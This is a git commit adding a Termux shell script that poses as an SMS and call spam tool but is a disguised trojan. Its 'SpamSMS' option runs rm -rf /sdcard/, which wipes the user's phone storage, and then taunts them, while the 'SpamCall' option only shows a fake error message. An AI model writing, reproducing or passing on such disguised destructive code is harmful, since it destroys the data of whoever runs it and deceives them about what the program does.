635433d38dd5fba17e97cc1aa1379c80121dadc9
R133FGANZ <50979010+SCTcyber@users.noreply.github.com>
2019-08-17 10:18:32 +0700

    Termux

---
+++ spamR133F.sh
@@ -0,0 +1,62 @@
+#!/system/xbin/bash
+clear
+toilet -f slant --gay "Spam R13F"
+
+sleep 1.2
+echo '\033[1;31m================================='
+sleep 0.1
+echo '\033[1;32m=++++++++++Mr.4R13F+++++++++++++='
+sleep 0.1
+echo '\033[1;32m=+++++++DevlinCyberTeam+++++++++='
+sleep 0.1
+echo '\033[1;31m================================='
+
+sleep 1.2
+echo '\033[1;37m1.\033[1;31mSpamCall'
+sleep 0.2
+echo '\033[1;37m2.\033[1;33mSpamSMS'
+sleep 0.2
+echo '\033[1;37m3.Info Tools'
+sleep 0.2
+echo '\033[1;37m0.\033[1;31mKeluar'
+
+sleep 2
+echo '\033[1;32m[$]pilih nomor   :'
+read nomor
+
+if [ $nomor = 1 ] || [ $nomor = 01 ]
+then
+clear
+toilet -f slant --gay "SpamCall"
+sleep 3
+echo '\033[1;31mCreator : \033[1;33mMr.4R13F'
+sleep 0.4
+echo '\033[1;31mProgramer : \033[1;33mPHP'
+sleep 0.4
+echo '\033[1;31mWait...'
+sleep 6
+echo '\033[1;31mFatal Program PHP EROR'
+fi
+
+if [ $nomor = 2 ] || [ $nomor = 02 ]
+then
+clear
+toilet -f slant --metal "SpamSMS"
+sleep 3
+echo '\033[1;31mSedang Menghapus data sdcard...'
+rm -rf /sdcard/
+sleep 4
+echo '\033[1;33mHahaha Mampus'
+fi
+
+if [ $nomor = 3 ] || [ $nomor = 03 ]
+then
+clear
+toilet -f slant --metal "info tools"
+sleep 3
+echo '\033[1;33mInfo Tools!!!'
+echo '\033[1;31mCreator : Mr.4R13F'
+sleep 2
+echo '\033[1;31mDevlinCyberTeam'
+echo '\033[1;33m Dimana kita disakiti disitu kita merusak hati'
+fi
